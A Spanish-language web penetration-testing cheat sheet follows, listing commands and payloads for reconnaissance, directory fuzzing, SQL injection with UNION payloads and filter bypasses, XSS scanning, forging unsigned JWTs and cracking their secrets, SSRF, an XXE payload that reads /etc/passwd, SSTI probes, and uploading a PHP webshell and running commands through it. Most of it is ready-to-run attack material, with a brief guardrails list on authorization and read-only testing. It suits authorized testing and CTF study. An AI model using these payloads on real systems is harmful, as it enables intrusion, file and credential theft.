# Web — enumeración, fuzzing y explotación

## Reconocimiento pasivo

```bash
whatweb -a 3 https://<host>
wafw00f https://<host>
curl -sI https://<host>
curl -s https://<host>/robots.txt
curl -s https://<host>/sitemap.xml
```

## Subdominios

```bash
subfinder -d <dominio> -silent | tee work/subs.txt
amass enum -passive -d <dominio>
dnsx -l work/subs.txt -resp -silent
```

## Directorios y archivos

```bash
ffuf -u https://<host>/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \
     -mc 200,204,301,302,307,401,403 -t 40 -o work/ffuf-dirs.json

gobuster dir -u https://<host> -w /usr/share/wordlists/dirb/common.txt -x php,txt,bak,zip,old

# Virtual hosts
ffuf -u https://<host>/ -H "Host: FUZZ.<dominio>" -w work/subs.txt -fs 0
```

Extensiones que siempre valen la pena: `.bak`, `.old`, `.zip`, `.sql`, `.git/HEAD`,
`.env`, `.map`, `config.php~`.

## Vulnerabilidades conocidas

```bash
nuclei -u https://<host> -severity low,medium,high,critical -o work/nuclei.txt
nikto -h https://<host> -o work/nikto.txt
```

## SQL injection

```bash
# Manual primero
' ORDER BY 5-- -
' UNION SELECT 1,2,3,4,5-- -

# Automático
sqlmap -u 'https://<host>/buscar?q=1' --batch --dbs
sqlmap -u 'https://<host>/buscar?q=1' --batch -D <db> --tables
sqlmap -r work/request.txt --batch --dump
```

Bypass de filtros: variar mayúsculas (`Or`), comentarios (`/**/`), `%09`, `%0a`,
concatenación (`||`), `char()` en vez de comillas.

## XSS

```bash
dalfox url 'https://<host>/buscar?q=test' --skip-bav
```

## JWT

```bash
# Decodificar sin verificar
python -c "import base64,json,sys;t=sys.argv[1].split('.')[0];print(base64.urlsafe_b64decode(t+'='*(-len(t)%4)))" <token>

# alg:none
python - <<'PY'
import base64, json
b = lambda d: base64.urlsafe_b64encode(json.dumps(d).encode()).rstrip(b'=').decode()
print(b({"alg":"none"}) + "." + b({"usuario":"admin","rol":"admin"}) + ".")
PY

# Fuerza bruta de secreto HS256
hashcat -m 16500 token.txt /usr/share/wordlists/rockyou.txt
```

## SSRF / XXE / SSTI

```bash
# SSRF con callback propio
curl -s 'https://<host>/fetch?url=http://<tu-servidor>:8000/'

# XXE
curl -s -X POST https://<host>/api -H 'Content-Type: application/xml' \
  --data '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><r>&x;</r>'

# SSTI: detección
{{7*7}}   ${7*7}   <%= 7*7 %>   #{7*7}
```

## Source maps y bundles

```bash
curl -s https://<host>/assets/index-XXXX.js | head -c 2000
curl -s https://<host>/assets/index-XXXX.js.map -o work/index.map
python -c "import json;d=json.load(open('work/index.map'));print('\n'.join(d['sources']))"
```

## Webshell por upload (solo CTF o autorizado)

```bash
curl -s -F 'file=@work/shell.php' https://<host>/upload
curl -s 'https://<host>/uploads/shell.php?c=id'
```

## Guardrails

- Sin `--risk 3` ni `--level 5` de sqlmap sin autorización.
- Sin borrar ni modificar datos: solo lectura y prueba mínima.
- Registrar cada request relevante para la evidencia.
